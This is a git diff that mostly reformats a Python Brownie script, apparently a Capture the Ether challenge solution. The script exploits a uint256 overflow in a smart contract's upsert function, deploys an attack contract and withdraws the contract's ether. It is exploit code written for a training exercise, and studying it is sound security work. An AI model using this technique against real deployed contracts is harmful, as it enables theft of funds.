@@ -1,11 +1,12 @@
 #!/usr/bin/python3
-from brownie import Attack
-from scripts.deploy import deploy
-from scripts.helpful_scripts import get_account
-from colorama import Fore
 from time import time
 
-#? https://ledgerops.com/blog/capture-the-ether-part-2-of-3-diving-into-ethereum-math-vulnerabilities/
+from brownie import Attack
+from colorama import Fore
+from scripts.deploy import deploy
+from scripts.helpful_scripts import get_account
+
+# ? https://ledgerops.com/blog/capture-the-ether-part-2-of-3-diving-into-ethereum-math-vulnerabilities/
 
 # * colours
 green = Fore.GREEN
@@ -29,18 +30,19 @@ def hack(contract_address=None, attacker=None):
         print(f"{red}Something is wrong{reset}")
         exit(-1)
 
-    
     print_colour(target.isComplete())
 
     # max uint256 - time in seconds
     overflow = (2**256) - (24 * 60 * 60)
     value = "1 ether"
 
-    #? uint256 index, uint256 timestamp
-    overwrite_head_pointer = target.upsert(1, overflow, {"from": attacker, "value": value})
+    # ? uint256 index, uint256 timestamp
+    overwrite_head_pointer = target.upsert(
+        1, overflow, {"from": attacker, "value": value}
+    )
     overwrite_head_pointer.wait(1)
 
-    #? uint256 index, uint256 timestamp
+    # ? uint256 index, uint256 timestamp
     reset_head_pointer = target.upsert(2, 0, {"from": attacker, "value": value})
     reset_head_pointer.wait(1)
 
@@ -50,16 +52,13 @@ def hack(contract_address=None, attacker=None):
     attack = Attack.deploy(target.address, {"from": attacker, "value": value})
     attack.wait(1)
 
-    #? uint256 index
+    # ? uint256 index
     withdraw = target.withdraw(2, {"from": attacker})
     withdraw.wait(1)
 
-        
-
-
     print_colour(target.isComplete())
 
-    #assert target.isComplete() == True
+    # assert target.isComplete() == True
 
 
 def main(contract_address=None):
